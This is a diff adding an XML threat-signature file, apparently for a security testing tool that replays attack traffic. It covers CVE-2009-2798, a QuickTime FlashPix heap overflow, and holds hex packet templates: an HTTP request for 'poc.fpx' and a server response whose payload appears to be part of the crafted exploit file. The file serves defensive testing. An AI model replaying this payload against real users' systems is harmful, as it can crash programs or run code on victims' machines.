@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Apple QuickTime FlashPix File Buffer Overflow"/>
+    <EngDesc display="true" value="A heap buffer overflow vulnerability has been reported in Apple QuickTime. The error is due to improper bounds checking when handling FlashPix files. A remote attacker can exploit this vulnerability by enticing a user to view specially crafted FlashPix files. Successful exploitation of this vulnerability can lead to arbitrary code execution in the context of the current user. An unsuccessful code execution attempt can lead to abnormal termination of the vulnerable program."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS/IMAP/POP3/SMB/CIFS/SMTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Apple"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Apple_Computer_QuickTime"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Apple_Computer_QuickTime_7.x_prior_to_7.6.4"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-2798"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="803be140373952024429f84169c4da74"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633964689139112071"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1260786641" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="BW"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="BX"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="BX"/>
+      <for index="BW"/>
+    </for>
+    <for index="BP">
+      <for index="BX"/>
+      <for index="BW"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:0C:29:AC:4E:0F" destMac="00:1B:78:75:79:68" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01FD" Identification="0316" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="93EC" srcIP="172.16.8.214" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="1058" destPort="$HTTPdestPort" SeqNumber="0B4A1710" AckNumber="807CF817" HeaderLength="05" WindowSize="FAF0" Checksum="B0F5" UrgentPointer="0000" Options="" Payload="474554202F7E6A7869612F706F632E66707820485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F782D786269746D61702C20696D6167652F6A7065672C20696D6167652F706A7065672C206170706C69636174696F6E2F766E642E6D732D657863656C2C206170706C69636174696F6E2F766E642E6D732D706F776572706F696E742C206170706C69636174696F6E2F6D73776F72642C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A55412D4350553A207838360D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A49662D4D6F6469666965642D53696E63653A204D6F6E2C2031342053657020323030392032333A31373A323920474D540D0A49662D4E6F6E652D4D617463683A2022363131303031662D31316130302D34373339316465396231343430220D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E323B205356313B202E4E455420434C5220312E312E34333232290D0A486F73743A203137322E31362E312E320D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="BP" Count="">
+      <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:AC:4E:0F" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0435" Identification="2BD1" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="A8F9" srcIP="$destIP" destIP="172.16.8.214" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="1058" SeqNumber="807E0F8B" AckNumber="0B4A18E5" HeaderLength="05" WindowSize="1920" Checksum="FB7F" UrgentPointer="0000" Options="" Payload="0303030303020305000304000304010202020203030202020203020203020003030302010302020201030403050201030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030202020202020303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303020303020303020303020202020203030202020203020203020203030303030201020201020303030302030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030202020202020303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030101010303030303030303030303030303030303030303030303030303030303030202020202020202020303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
